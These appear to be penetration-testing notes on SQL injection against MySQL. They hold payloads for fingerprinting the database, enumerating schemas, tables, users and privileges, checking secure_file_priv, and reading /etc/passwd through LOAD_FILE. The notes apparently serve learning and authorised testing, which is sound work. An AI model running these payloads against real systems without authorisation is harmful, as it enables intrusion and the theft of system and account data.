

Likely Application Correlations

| web server   | OS      | DB    |
| ------------ | ------- | ----- |
| Apache,nginx | linux   | MySQL |
| IIS          | Windows | MSSQL |
MySQL 

|Payload|When to Use|Expected Output|Wrong Output|
|---|---|---|---|
|`SELECT @@version`|When we have full query output|MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'|In MSSQL it returns MSSQL version. Error with other DBMS.|
|`SELECT POW(1,1)`|When we only have numeric output|`1`|Error with other DBMS|
|`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`.|Will not delay response with other DBM|
Using InformationSchema to get db info
```SQL
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Enumerate tables with database specified
```sql
SELECT * FROM my_database.users;
```

Enumerate table info
```sql
SELECT TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='TABLE_NAME'
```

Determine user account
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Check for super admin
```sql
SELECT super_priv FROM mysql.user
```

Check privileges from schema
```sql
SELECT grantee, privilege_type FROM information_schema.user_privileges
```
Check privileges for specific account from schema
```sql
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="USER_ACCOUNT_NAME"
```
Get current DB name
```SQL
SELECT database()
```

Get File Contents
```sql
SELECT LOAD_FILE('/etc/passwd');
```

Get secure file priv
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
Get secure file priv with select
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
